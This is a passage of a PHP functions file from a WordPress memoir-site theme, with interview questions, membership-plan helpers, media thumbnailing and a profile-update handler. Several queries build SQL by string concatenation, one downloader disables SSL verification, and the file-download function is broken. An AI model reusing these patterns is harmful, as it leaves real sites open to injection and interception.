			'47'=>"What are some of your fondest memories with your husband/wife?",
			'48'=>"More stories about my marriage and partnerships.",
			'49'=>"What are your children’s names? Describe them.",
			'50'=>"How did you feel when you found out that you were going to be a parent?",
			'51'=>"Can you describe the moment when you saw your child for the first time?",
			'52'=>"What were your children like as infants and toddlers?",
			'53'=>"How has being a parent changed you?",
			'54'=>"Do you have any favorite stories about your kids?",
			'55'=>"What was the most challenging part about raising kids?",
			'56'=>"What was your goal as a parent?",
			'57'=>"How do you describe yourself as a parent?",
			'58'=>"Do you remember when your last child left home for good? What was that like?",
			'59'=>"More stories about my children.",
			'60'=>"What were some of your first jobs? How much did you make?",
			'61'=>"Tell me something about your favorite job, what inspired you to keep working there?",
			'62'=>"What do/did you do? Why did you choose it as a career?",
			'63'=>"What are some of the things you are proudest of in your career?",
			'64'=>"Describe your finances in your early career. What did things cost? Did you make enough?",
			'65'=>"What lessons has your work life taught you?",
			'66'=>"Do you have any favorite stories from your work life?",
			'67'=>"More stories about my working life.",
			'68'=>"When and where did you serve?Why did you choose it, if you had a choice?",
			'69'=>"What was the most exciting thing that happened to you in the service?",
			'70'=>"What was the most frighteningthing that happened to you in the service?",
			'71'=>"What was basic training like?",
			'72'=>"Can you describe how you felt coming home from deployment?",
			'73'=>"Did you ever learn something about a fellow service member that surprised you?",
			'74'=>"How do you think your time in the military affected you?",
			'75'=>"What are some of the best things about being in the service? The worst?",
			'76'=>"More stories about my military life.",
			'77'=>"What did you do for fun outside of your job as an adult? Why?",
			'78'=>"What are your hobbies? Why do you do them?",
			'79'=>"What’s the most fun you've had in a single day as an adult?",
			'80'=>"Describe a typical day in your life.",
			'81'=>"What’s the happiest thing that ever happened to you as an adult?",
			'82'=>"What’s the saddest thing that ever happened to you as an adult?",
			'83'=>"More stories about my adult life.",
			'84'=>"Did you attend church or religious services as a child? What were your earliest memories?",
			'85'=>"Can you tell me about your religious beliefs/spiritual beliefs? What is your religion?",
			'86'=>"What do you like about your religion? Dislike?",
			'87'=>"What was the most awe-inspiring thing that happened because of your religion?",
			'88'=>"What do you think happens to you when you die?",
			'89'=>"More stories about my religion.",
			'90'=>"What historical events have you witnessed either in person or through the media?",
			'91'=>"What do you consider to be the most significant political event that has occurred during your life?",
			'92'=>"Have you ever fought for a political cause? Why?",
			'93'=>"Describe how you felt about President Kennedy’s assassination?",
			'94'=>"Describe how you felt about the U.S. landing on the moon?",
			'95'=>"Describe how you felt about the fall of the Berlin Wall?",
			'96'=>"Describe how you felt about the explosion of the Challenger?",
			'97'=>"Describe how you felt about the attacks on Sept.11?",
			'98'=>"More stories about historical moments.",
			'99'=>"What famous person do you admire? What made them admirable?",
			'100'=>"What are some favorites? ( Color, food, ice cream, book, movie, song, sport, etc.)",
			'101'=>"Is there something you wish you could do over again?",
			'102'=>"What is something that you are really proud of and why?",
			'103'=>"What are the goals you are still working toward?",
			'104'=>"When people look back at your life, how do you want to be remembered?",
			'105'=>"What do you think about when you’re alone?",
			'106'=>"Did you suffer because of your race, religion, ethnicity, home country, and language?",
			'107'=>"Tell me about a memorable moment in your life; a time you will never forget.",
			'108'=>"What are some of the changes in our society that you have seen in your lifetime?",
			'109'=>"What is the funniest thing that has happened to you?",
			'110'=>"What are you best known for? ",
			'111'=>"What’s the most interesting thing about you that few people know?",
			'112'=>"What’s the biggest change in the world today from the world you knew as a child?",
			'113'=>"How have you changed? ",
			'114'=>"What was the nicest act of human kindness you've performed or benefited from?",
			'115'=>"Who has been the most important person in your life? Can you tell me about him or her?",
			'116'=>"Who has been the biggest influence on your life? What lessons did that person teach you?",
			'117'=>"What are the most important lessons you’ve learned in life?",
			'118'=>"Are there any funny stories or memories or characters from your life?",
			'119'=>"What was the happiest time in your life?",
			'120'=>"Describe the most challenging part of your life.",
			'121'=>"Do you have any regrets?",
			'122'=>"What are your hopes for what the future holds for you?",
			'123'=>"What are your hopes for what the future holds for your loved ones?",
			'124'=>"What is there about you that no one knows about?",
			'125'=>"What advice do you have for young couples?",
			'126'=>"Do you think about dying? Are you scared?",
			'127'=>"Do you have any last wishes?",
			'128'=>"What have you learned from life? ",
			'129'=>"Has an illness changed you? What have you learned?",
			'130'=>"How do you want to be remembered?",
			'131'=>"If you could only keep five possessions, what would they be?",
			'132'=>"What do you want your tombstone to say?",
			'133'=>"What was your most embarrassing moment?",
			'134'=>"What is a skill you'd like to learn and why?",
			'135'=>"What does a perfect day look like to you?",
			'136'=>"How would your friends describe you?",
			'137'=>"What does the word “family�? mean to you?",
			'138'=>"What is your most memorable travel experience?",
			'139'=>"What is the funniest thing that’s ever happened to you?",
			'140'=>"What is your greatest hope?",
			'141'=>"What are the main lessons you’ve learned in life?",
			'142'=>"If you could meet any historical figure, of the past or present, who would it be and why?",
			'143'=>"More personal thoughts."
	);
	
	if (array_key_exists($qid, $questions)) {
    	return $questions[$qid];
	}
	return '';
}
// get the custom plan heading 
function get_plan_heading($level_id = ''){
	$plan_heading = 'Membership Plan';
	if(empty($level_id )){
		return $plan_heading;
	}
	
	if($level_id==1){ // this is standard Plan
		if(get_field('standard_plan_heading', 'option')){
			$plan_heading = get_field('standard_plan_heading', 'option');
		}
	}elseif($level_id==2){ // this is standard Plan
		if(get_field('eternal_plan_heading', 'option')){
			$plan_heading = get_field('eternal_plan_heading', 'option');
		}
	}elseif($level_id==3){ // this is standard Plan
		if(get_field('best_value_plan_heading', 'option')){
			$plan_heading = get_field('best_value_plan_heading', 'option');
		}
	}elseif($level_id==4){ // this is standard Plan
		if(get_field('free_trial_plan_heading', 'option')){
			$plan_heading = get_field('free_trial_plan_heading', 'option');
		}
	}
	return $plan_heading;
}
// get the custom plan description 
function get_plan_description($level_id = ''){
	$plan_description = '';
	if(empty($level_id )){
		return $plan_description;
	}
	
	if($level_id==1){ // this is standard Plan
		if(get_field('standard_plan_heading', 'option')){
			$plan_description = get_field('standard_plan_description', 'option');
		}
	}elseif($level_id==2){ // this is standard Plan
		if(get_field('eternal_plan_description', 'option')){
			$plan_description = get_field('eternal_plan_description', 'option');
		}
	}elseif($level_id==3){ // this is standard Plan
		if(get_field('best_value_plan_description', 'option')){
			$plan_description = get_field('best_value_plan_description', 'option');
		}
	}elseif($level_id==4){ // this is standard Plan
		if(get_field('free_trial_plan_description', 'option')){
			$plan_description = get_field('free_trial_plan_description', 'option');
		}
	}
	return $plan_description;
}
// check is it video or image etc
function check_is_video_image($file_url = ''){
	
	$default_type = '';
	$video_extension_array = array('mp4','webm','ogg','mov','m4v','avi','mpg');
	$audio_extension_array = array('mp3','wav', 'm4a');
	$img_extension_array = array('jpg', 'jpeg', 'png', 'bmp', 'tiff', 'gif');	
	//echo 'EXT::'.$file_extension = end(explode(".", $file_url));
	$file_extension =  pathinfo(parse_url($file_url)['path'], PATHINFO_EXTENSION);
	if(in_array(strtolower($file_extension),$video_extension_array))
	{
		$default_type = 'video';
	}elseif(in_array(strtolower($file_extension),$audio_extension_array))
	{
		$default_type = 'audio';
	}elseif(in_array(strtolower($file_extension),$img_extension_array))
	{
		$default_type = 'image';
	}else{
		$default_type = $file_extension;
	}
	return $default_type;
}
// Get the cloud file url
function get_cloud_front_url($url = ''){
	$file_url = '';
	if(!empty($url)){
		$exploded = explode('/', $url);
		$file_name = end($exploded);
		$file_url = 'http://d2zozsn31kp46g.cloudfront.net/'.$file_name;
	}
	return $file_url;
}
function get_imgname_from_url($url){
	$file_name = '';
	if(!empty($url)){
		$exploded = explode('/', $url);
		$file_name = end($exploded);
	}
	return $file_name;
}

add_action( 'woocommerce_before_single_product', 'check_is_extra_storage_allowed', 10, 3 );
function check_is_extra_storage_allowed(){
	$is_allowed = true;
	if ( !is_user_logged_in() ) {
		$is_allowed = false;
		echo  '<div class="extra-storage-msg">Please login to purchase extra storage. <a href="'.site_url('/login/').'">Sign In</a></div>';
	}else{
		$user_id = get_current_user_id();
		$level = pmpro_getMembershipLevelsForUser($user_id);
		if(!empty($level)){	
			if($level[0]->ID==4){ // it is free user	
			$is_allowed = false;	
				echo  '<div class="extra-storage-msg">You are using free trial account. Please upgrade your plan to purchase extra storgae. <a href="'.site_url('/my-account/membership-levels/').'">Choose a Plan</a></div>';
			}
		}
	}
	if(!$is_allowed){
		echo '<style>.summary.entry-summary{display:none;}.woocommerce-checkout{display:none;}</style>';
	}
}
// get contributor stuff for the current post and current contributor
function get_post_contributor_stuff($post_id = '', $email = '')
{
	global $wpdb;
	$contributor_stuff = array();
	if($post_id=='' OR $email==''){
		return $contributor_stuff;
	}
	
	$con_table_name = $wpdb->prefix . CONTRIBUTOR_LOG;
    $contributor_data = $wpdb->get_results( "SELECT * FROM $con_table_name WHERE p_id='".$post_id."' and user_email='". $email."' and media_type!='notes'");
	//echo '<pre>';
	//print_r($contributor_data);
	if($contributor_data){
		foreach ($contributor_data as $data) {			
			$contributor_stuff[] = $data->media_id;
		}
	}
	return $contributor_stuff;
}
// get contributor Notes for the current post and current contributor
function get_post_contributor_notes($post_id = '', $email = '')
{
	global $wpdb;
	$contributor_notes = array();
	if($post_id=='' OR $email==''){
		return $contributor_notes;
	}
	
	$con_table_name = $wpdb->prefix . CONTRIBUTOR_LOG;
    $contributor_data = $wpdb->get_results( "SELECT notes FROM $con_table_name WHERE p_id='".$post_id."' and user_email='". $email."' and media_type='notes'");
	//echo '<pre>';
	//print_r($contributor_data);
	if($contributor_data){
		foreach ($contributor_data as $data) {
			
			$contributor_notes[] = $data->notes;
		}
	}
	return $contributor_notes;
}

function am_update_user_profile() {
    $postData = $_POST;
    $user_id = get_current_user_id();
    if (!wp_verify_nonce($postData['nonce'], 'ajax-nonce')) {
        die;
    }

    $flag = true;
    $msg = "Please fill all required fields.";
    $first_name = trim($postData['first_name']);
    $last_name = trim($postData['last_name']);
    $email = trim($postData['email']);
    $password = trim($postData['password']);
    $password2 = trim($postData['password2']);
    $pmpro_baddress1 = trim($postData['pmpro_baddress1']);
    $pmpro_baddress2 = trim($postData['pmpro_baddress2']);
    $pmpro_bcity = trim($postData['pmpro_bcity']);
    $pmpro_bstate = trim($postData['pmpro_bstate']);
    $pmpro_bzipcode = trim($postData['pmpro_bzipcode']);
    $pmpro_bcountry = trim($postData['pmpro_bcountry']);
    $pmpro_bphone = trim($postData['pmpro_bphone']);
    
    $pmpro_aa_firstname = (!empty($postData['pmpro_aa_firstname']) ? trim($postData['pmpro_aa_firstname']) : "");
    $pmpro_aa_lastname = (!empty($postData['pmpro_aa_lastname']) ? trim($postData['pmpro_aa_lastname']) : "");
    $pmpro_aa_emailaddress = (!empty($postData['pmpro_aa_emailaddress']) ? trim($postData['pmpro_aa_emailaddress']) : "");
    $pmpro_aa_phonenumber = (!empty($postData['pmpro_aa_phonenumber']) ? trim($postData['pmpro_aa_phonenumber']) : "");
    $pmpro_aa_address1 = (!empty($postData['pmpro_aa_address1']) ? trim($postData['pmpro_aa_address1']) : "");
    $pmpro_aa_city = (!empty($postData['pmpro_aa_city']) ? trim($postData['pmpro_aa_city']) : "");
    $pmpro_aa_state = (!empty($postData['pmpro_aa_state']) ? trim($postData['pmpro_aa_state']) : "");
    $pmpro_aa_zipcode = (!empty($postData['pmpro_aa_zipcode']) ? trim($postData['pmpro_aa_zipcode']) : "");

    if (empty($first_name) || empty($last_name) || empty($email) || empty($pmpro_baddress1) || empty($pmpro_bcity) || empty($pmpro_bstate) || empty($pmpro_bzipcode) || empty($pmpro_bcountry) || empty($pmpro_bphone)) {
        $flag = false;
    }

    if ($flag && !empty($email)) {
        if (!is_email(esc_attr($email))) {
            $flag = false;
            $msg = "The Email you entered is not valid.  please try again.";
        } elseif (email_exists(esc_attr($email)) != $user_id) {
            $flag = false;
            $msg = "This email is already used by another user. try a different one.";
        } else {
            wp_update_user(array('ID' => $user_id, 'user_email' => esc_attr($email)));
        }
    }

    if ($flag && !empty($password) && !empty($password2)) {
        if ($password == $password2) {
            wp_update_user(array('ID' => $user_id, 'user_pass' => esc_attr($password)));
        } else {
            $flag = false;
            $msg = "The passwords you entered do not match. Your password was not updated.";
        }
    }

    if ($flag) {
        update_user_meta($user_id, 'first_name', esc_attr($first_name));
        update_user_meta($user_id, 'last_name', esc_attr($last_name));
        update_user_meta($user_id, 'pmpro_baddress1', esc_attr($pmpro_baddress1));
        update_user_meta($user_id, 'pmpro_baddress2', esc_attr($pmpro_baddress2));
        update_user_meta($user_id, 'pmpro_bcity', esc_attr($pmpro_bcity));
        update_user_meta($user_id, 'pmpro_bstate', esc_attr($pmpro_bstate));
        update_user_meta($user_id, 'pmpro_bzipcode', esc_attr($pmpro_bzipcode));
        update_user_meta($user_id, 'pmpro_bcountry', esc_attr($pmpro_bcountry));
        update_user_meta($user_id, 'pmpro_bphone', esc_attr($pmpro_bphone));
        
        update_user_meta($user_id, 'pmpro_aa_firstname', esc_attr($pmpro_aa_firstname));
        update_user_meta($user_id, 'pmpro_aa_lastname', esc_attr($pmpro_aa_lastname));
        update_user_meta($user_id, 'pmpro_aa_emailaddress', esc_attr($pmpro_aa_emailaddress));
        update_user_meta($user_id, 'pmpro_aa_phonenumber', esc_attr($pmpro_aa_phonenumber));
        update_user_meta($user_id, 'pmpro_aa_address1', esc_attr($pmpro_aa_address1));
        update_user_meta($user_id, 'pmpro_aa_city', esc_attr($pmpro_aa_city));
        update_user_meta($user_id, 'pmpro_aa_state', esc_attr($pmpro_aa_state));
        update_user_meta($user_id, 'pmpro_aa_zipcode', esc_attr($pmpro_aa_zipcode));
    }
    if ($flag) {
        echo json_encode(array("status" => "success", "message" => "Updated successfully."));
    } else {
        echo json_encode(array("status" => "fail", "message" => $msg));
    }
    die;
}

add_action('wp_ajax_am_update_user_profile', 'am_update_user_profile');
add_action('wp_ajax_nopriv_am_update_user_profile', 'am_update_user_profile');

function download_img_from_url($url){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);	
        $result = curl_exec($ch);
        curl_close($ch);
		//var_dump($result);
        return($result);
    }

// generate thumbnail and save in thumbnail folder
function generate_img_thumbnail($url, $width = 150, $height = 150, $filename = '') {

    $directory_path_file = UPLOAD_IMG_THUMB.$filename;
	// download and create gd image
   // $image = ImageCreateFromString(file_get_contents($url));
   $image = @ImageCreateFromString(download_img_from_url($url));   
	if ( $image === false) {		
		return false;
	}
    // calculate resized ratio
    // Note: if $height is set to TRUE then we automatically calculate the height based on the ratio
    //$height = $height === true ? (ImageSY($image) * $width / ImageSX($image)) : $height;

    $w = ImageSX($image);
    $h = ImageSY($image);

    if($w > $h) {
            $new_height =   $height;
            $new_width  =   floor($w * ($new_height / $h));
            $crop_x     =   ceil(($w - $h) / 2);
            $crop_y     =   0;
    }
    else {
            $new_width  =   $width;
            $new_height =   floor( $h * ( $new_width / $w ));
            $crop_x     =   0;
            $crop_y     =   ceil(($h - $w) / 2);
    }

    // create image
    $output = ImageCreateTrueColor($width, $height);

    //support transparent png images
    if(exif_imagetype($url) == IMAGETYPE_PNG) {
        imagealphablending($output, false);
        imagesavealpha($output,true);
        $transparent = imagecolorallocatealpha($output, 255, 255, 255, 127);
        imagefilledrectangle($output, 0, 0, $new_width, $new_height, $transparent);
    }

    ImageCopyResampled($output, $image, 0, 0, $crop_x, $crop_y, $new_width, $new_height, $w, $h);

    // save image
	if(exif_imagetype($url) == IMAGETYPE_PNG) {
		imagepng($output,  $directory_path_file);
		//return true;
	}
	else {
		ImageJPEG($output, $directory_path_file, 70);
		//return true;
	}
}
// only call it for image and return thumb/original img url
function get_create_thumbnail_url($thmbimg_url=''){
	if(empty($thmbimg_url)){
		return $thmbimg_url;
	}
	
	$img_name = get_imgname_from_url($thmbimg_url);	
	// if thumb already exist
	if (!is_file(UPLOAD_IMG_THUMB.$img_name)) {											
		$is_created_thumb = generate_img_thumbnail($thmbimg_url, THUMB_W, THUMB_H, $img_name);
		// is thumb created and exist
		if (is_file(UPLOAD_IMG_THUMB.$img_name)) {					
			return get_template_directory_uri().'/'.THUMBDIR_NAME.$img_name;
		}
	}else{
		return get_template_directory_uri().'/'.THUMBDIR_NAME.$img_name;
	}
	return $thmbimg_url;
	
}
// make media array good
function make_media_array_filter($media = array()){
	$new_media = array();
	$filter_media = array();
	if(!empty($media)){
		foreach($media as $md){
			if(empty($md['url'])){
				continue;
			}
			$uploaded_url = $md['url'];
			$new_media['id'] = $md['id']; 
			$new_media['type'] = $md['type'];				
			if($md['type']=='video' and  strpos($uploaded_url, 'amazonaws.com') === false){
			 //$is_video = check_is_video_image($uploaded_url);
			 $file_url = get_cloud_front_url($uploaded_url);
			 $new_media['thumbnail'] = $file_url;
			 $new_media['url'] = $file_url;
			}else{				
				 $new_media['url'] = $md['url'];
				 $file_type = check_is_video_image($uploaded_url);							 
				 $file_url = get_cloud_front_url($uploaded_url);
				 if( $file_type =='image'){
					 $thmbimg_url = !empty($file_url) ? $file_url : $md['thumbnail'];
					 $thumb_url = get_create_thumbnail_url($thmbimg_url);
					 $new_media['thumbnail'] = $thumb_url; 
				 }else{
					$new_media['thumbnail'] = $md['thumbnail'];					
				 }
			}
			$new_media['name'] = $md['name']; 
			$new_media['desc'] = $md['desc'];
			$filter_media[] = $new_media;
		}		
		return $filter_media;
	}
	return $media;
}
// force download file
function download_file_api($url) {
   		header('Content-Disposition: attachment; filename=' . urlencode($url));
		header('Content-Type: application/force-download');
		header('Content-Type: application/octet-stream');
		header('Content-Type: application/download');
		header('Content-Description: File Transfer');
		header('Content-Length: ' . filesize($url));
		echo file_get_contents($fname);
		exit();
}

function woocommerce_custom_subscription_product_single_add_to_cart_text( $text = '' , $post = '' ) {
	
	global $product;
	
	if ( $product->is_type( 'subscription' ) ) {
		$text = get_option( WC_Subscriptions_Admin::$option_prefix . '_add_to_cart_button_text', __( 'Submit', 'woocommerce-subscriptions' ) );
	} else {
		$text = $product->add_to_cart_text(); // translated "Read More"
	}
	
	return $text;
}
add_filter('woocommerce_product_single_add_to_cart_text', 'woocommerce_custom_subscription_product_single_add_to_cart_text', 2, 10);